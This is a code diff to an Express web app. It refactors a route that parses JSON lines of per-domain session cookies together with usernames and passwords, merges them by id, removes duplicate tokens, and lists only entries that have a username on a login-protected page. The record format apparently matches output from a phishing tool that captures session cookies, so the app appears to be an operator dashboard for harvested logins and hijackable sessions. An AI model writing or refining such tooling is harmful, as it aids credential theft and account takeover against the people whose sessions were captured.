@@ -56,42 +56,21 @@ app.get('/', checkAuthenticated, async (req, res) => {
       if (line.trim().startsWith('{')) {
         try {
           const item = JSON.parse(line)
-          let existingItem = dataMap.get(item.id)
-          if (existingItem) {
-            let newTokens = []
-            Object.keys(item.tokens).forEach((domain) => {
-              Object.keys(item.tokens[domain]).forEach((tokenName) => {
-                const tokenDetails = item.tokens[domain][tokenName]
-                newTokens.push({
-                  path: tokenDetails.Path || '/',
-                  domain: domain,
-                  expirationDate: tokenDetails.ExpirationDate,
-                  value: tokenDetails.Value,
-                  name: tokenName,
-                  httpOnly: tokenDetails.HttpOnly,
-                  hostOnly: tokenDetails.HostOnly,
-                })
-              })
-            })
-            existingItem.tokens = existingItem.tokens.concat(newTokens)
-          } else {
-            let tokensArray = []
-            Object.keys(item.tokens).forEach((domain) => {
-              Object.keys(item.tokens[domain]).forEach((tokenName) => {
-                const tokenDetails = item.tokens[domain][tokenName]
-                tokensArray.push({
-                  path: tokenDetails.Path || '/',
-                  domain: domain,
-                  expirationDate: tokenDetails.ExpirationDate,
-                  value: tokenDetails.Value,
-                  name: tokenName,
-                  httpOnly: tokenDetails.HttpOnly,
-                  hostOnly: tokenDetails.HostOnly,
-                })
-              })
-            })
-            item.tokens = tokensArray
+          if (!dataMap.has(item.id)) {
+            item.tokens = convertTokens(item.tokens)
             dataMap.set(item.id, item)
+          } else {
+            let existingItem = dataMap.get(item.id)
+            existingItem.tokens = filterUniqueTokens(
+              existingItem.tokens.concat(convertTokens(item.tokens))
+            )
+
+            if (item.username && item.username.trim() !== '') {
+              existingItem.username = item.username
+            }
+            if (item.password && item.password.trim() !== '') {
+              existingItem.password = item.password
+            }
           }
         } catch (err) {
           console.error('Error parsing JSON from line:', line, err)
@@ -99,13 +78,50 @@ app.get('/', checkAuthenticated, async (req, res) => {
       }
     })
 
-    const uniqueData = Array.from(dataMap.values())
-    res.render('index.ejs', { data: uniqueData })
+    const filteredData = Array.from(dataMap.values()).filter(
+      (item) => item.username && item.username.trim() !== ''
+    )
+
+    res.render('index.ejs', { data: filteredData })
   } catch (err) {
     console.error(err)
     res.status(500).send('Server Error')
   }
 })
+
+function convertTokens(tokens) {
+  let tokensArray = []
+  Object.keys(tokens).forEach((domain) => {
+    Object.keys(tokens[domain]).forEach((tokenName) => {
+      const tokenDetails = tokens[domain][tokenName]
+      tokensArray.push({
+        path: tokenDetails.Path || '/',
+        domain: domain,
+        expirationDate: tokenDetails.ExpirationDate,
+        value: tokenDetails.Value,
+        name: tokenName,
+        httpOnly: tokenDetails.HttpOnly,
+        hostOnly: tokenDetails.HostOnly,
+      })
+    })
+  })
+  return tokensArray
+}
+
+function filterUniqueTokens(tokensArray) {
+  const uniqueTokens = []
+  const tokenSet = new Set()
+
+  tokensArray.forEach((token) => {
+    const tokenSignature = `${token.domain}:${token.name}:${token.value}`
+    if (!tokenSet.has(tokenSignature)) {
+      uniqueTokens.push(token)
+      tokenSet.add(tokenSignature)
+    }
+  })
+
+  return uniqueTokens
+}
 
 app.get('/login', checkNotAuthenticated, (req, res) => {
   res.render('login.ejs')
